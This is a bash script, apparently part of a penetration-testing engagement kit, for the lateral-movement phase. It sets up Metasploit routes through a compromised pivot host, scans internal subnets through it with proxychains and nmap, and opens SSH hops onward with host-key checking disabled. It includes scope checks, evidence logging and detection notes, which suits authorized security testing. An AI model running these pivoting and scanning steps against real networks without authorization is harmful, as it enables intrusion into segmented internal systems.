#!/usr/bin/env bash
# Phase 10 — Lateral movement (session label: lateral)
# Uses a compromised device as a pivot point to scan and attack devices that are
# only reachable from that device's perspective (internal / segmented network).
#
# Usage (from the engagement root):
#   ./10_lateral/lateral.sh pivot  <pivot_ip>              # set up Metasploit route via pivot
#   ./10_lateral/lateral.sh recon  <pivot_ip> <target_subnet>   # nmap scan through pivot
#   ./10_lateral/lateral.sh ssh    <pivot_ip> <next_ip>    # SSH hop to next target via pivot
#
# ATT&CK: T1210 (Exploitation of Remote Services), T1021 (Remote Services), T1046 (Network Scan)
# Kill-chain phase: Lateral Movement
# Session label: lateral
#
# Precondition: foothold on pivot_ip (Sliver beacon active from 06_c2, or SSH from 04/05).
. "$(dirname "$0")/../lib.sh"

LABEL=lateral

need() {
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || { echo "[!] $t missing — see 01_setup/attack-host-setup.md"; exit 3; }
  done
}

# ---------------------------------------------------------------------------
# pivot: create a Metasploit route through a compromised host, enabling the
# attack host to reach devices in network segments visible from the pivot.
# Tool: msfconsole  ATT&CK: T1210, T1021
# Detection: unexpected new connections from pivot host to internal targets.
# ---------------------------------------------------------------------------
do_pivot() {
  local pivot="${1:?usage: lateral.sh pivot <pivot_ip>}"
  require_scope "$pivot"; need msfconsole

  local dir; dir=$(new_run "$LABEL" "$pivot")
  echo "[*] Setting up Metasploit pivot route through ${pivot}"
  echo "[!] Requires an active Metasploit session (meterpreter) on ${pivot}."
  echo "    If using Sliver, use its SOCKS5 proxy instead (see README)."

  # Metasploit resource script: find session for pivot IP, add route, list routes
  local rc="${dir}/pivot_setup.rc"
  cat > "$rc" << RCEOF
# Metasploit pivot — route add through session on ${pivot}
# List sessions to find the session ID for ${pivot}
sessions -l
# Add a route: replace SESSION_ID with the ID of your pivot session
# route add 10.100.101.0/24 SESSION_ID
route print
RCEOF

  local cmd="msfconsole -q -r ${rc}"
  save_cmd "$dir" "pivot route add through ${pivot}; $cmd"
  echo "+ $cmd"
  msfconsole -q -r "$rc" 2>&1 | tee "${dir}/stdout.txt" || true

  echo
  echo "[*] After identifying the session ID, add the route manually:"
  echo "    msfconsole -q -x 'route add 10.100.101.0/24 <SESSION_ID>; route print'"
  echo "[*] Alternative (Sliver pivot): use SOCKS5 proxy:"
  echo "    In sliver-client:  socks5 start --host 127.0.0.1 --port 1080"
  echo "    Then:  proxychains nmap ... (see recon sub-command)"

  end_run "$LABEL" "$pivot"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# recon: run nmap through an established pivot to discover hosts and services
# on a subnet reachable only from the pivot's network position.
# Tool: nmap (via proxychains / Metasploit auxiliary)  ATT&CK: T1046
# Detection: port scans originating from pivot's IP, not the attack host.
# ---------------------------------------------------------------------------
do_recon() {
  local pivot="${1:?usage: lateral.sh recon <pivot_ip> <target_subnet>}"
  local subnet="${2:?target subnet required (e.g. 192.168.1.0/24)}"
  require_scope "$pivot"; need nmap

  local dir; dir=$(new_run "$LABEL" "$pivot")
  echo "[*] Lateral recon: pivot=${pivot}  subnet=${subnet}"
  echo "[i] Assumes Sliver SOCKS5 on 127.0.0.1:1080 OR Metasploit route is active."

  # Method 1: proxychains (works with Sliver SOCKS5)
  if command -v proxychains4 >/dev/null 2>&1; then
    local cmd="proxychains4 nmap -sT -Pn -n -p 22,80,443,554,8080,37777 ${subnet} --open"
    save_cmd "$dir" "pivot nmap via proxychains; $cmd"
    echo "+ $cmd"
    proxychains4 nmap -sT -Pn -n -p 22,80,443,554,8080,37777 "$subnet" --open \
      -oA "${dir}/lateral_scan" 2>&1 | tee "${dir}/stdout.txt" || true

  else
    # Method 2: Metasploit auxiliary/scanner/portscan/tcp through route
    local rc="${dir}/lateral_scan.rc"
    cat > "$rc" << RCEOF
use auxiliary/scanner/portscan/tcp
set RHOSTS ${subnet}
set PORTS 22,80,443,554,8080,37777
set THREADS 5
run
RCEOF
    local cmd="msfconsole -q -r ${dir}/lateral_scan.rc"
    save_cmd "$dir" "pivot nmap via msfconsole; $cmd"
    echo "+ $cmd  (Metasploit auxiliary scan through route)"
    msfconsole -q -r "$rc" 2>&1 | tee "${dir}/stdout.txt" || true
  fi

  end_run "$LABEL" "$pivot"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# ssh: SSH hop from attack host through the pivot to the next target.
# Establishes an SSH ProxyJump chain: attack -> pivot -> next_ip.
# Tool: ssh ProxyJump  ATT&CK: T1021.004
# Detection: SSH connection from pivot to next_ip (unexpected lateral connection).
# ---------------------------------------------------------------------------
do_ssh() {
  local pivot="${1:?usage: lateral.sh ssh <pivot_ip> <next_ip>}"
  local next="${2:?next target ip required}"
  require_scope "$pivot"
  # next_ip may be in a different subnet; skip scope guard if not on main subnet
  in_scope "$next" 2>/dev/null || echo "[i] ${next} is not in the WireGuard subnet — ensure it is reachable from pivot"
  need ssh

  local dir; dir=$(new_run "$LABEL" "$pivot")
  local SSH_USER="${SSH_USER:-admin}"
  echo "[*] SSH lateral hop: attack -> ${pivot} -> ${next}"
  echo "[!] Ensure SSH is open on ${next} and credentials are known."

  local cmd="ssh -J ${SSH_USER}@${pivot} ${SSH_USER}@${next}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  # Run interactively (opens a shell on next_ip)
  ssh -o StrictHostKeyChecking=no -J "${SSH_USER}@${pivot}" "${SSH_USER}@${next}" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  end_run "$LABEL" "$pivot"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
cmd="${1:-}"; shift || true
case "$cmd" in
  pivot) do_pivot "$@" ;;
  recon) do_recon "$@" ;;
  ssh)   do_ssh   "$@" ;;
  *) sed -n '2,17p' "$0"; exit 1 ;;
esac
